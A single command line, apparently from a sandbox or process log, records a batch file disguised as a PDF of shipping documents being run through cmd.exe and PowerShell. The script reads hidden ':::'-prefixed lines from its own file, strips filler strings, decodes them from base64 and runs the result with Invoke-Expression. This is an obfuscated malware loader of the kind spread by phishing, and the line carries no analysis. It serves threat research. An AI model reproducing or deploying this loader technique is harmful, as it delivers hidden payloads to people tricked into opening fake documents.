C:\WINDOWS\system32\cmd.exe  /S /D /c" echo $host.UI.RawUI.WindowTitle='C:\Users\admin\Desktop\Set of Documents (BL,PL,CL,COO) 3789994_48833.PDF.bat';$KFECNI=$MyInvocation.MyCommand.Path;if(!$KFECNI){$KFECNI=$PSCommandPath};if(!$KFECNI){$KFECNI=[Console]::Title};if(!$KFECNI){exit 1};$JSNCW=Get-Content $KFECNI -ErrorAction SilentlyContinue;if(!$JSNCW){exit 1};$TJOWG='';foreach($AKZRP in $JSNCW){if($AKZRP -and $AKZRP.StartsWith(':::')){$TJOWG+=$AKZRP.Substring(3)}};if(!$TJOWG){exit 1};$TJOWG=$TJOWG.Replace('VMPFU','');try{$MUSKJ=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($TJOWG));Invoke-Expression $MUSKJ;}catch{exit 1};$ZBFIN=''.Replace('EZCKKA','').Replace('BGAZMB','').Replace('PQSQCQ','');$HAZDV=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($ZBFIN));Invoke-Expression $HAZDV; "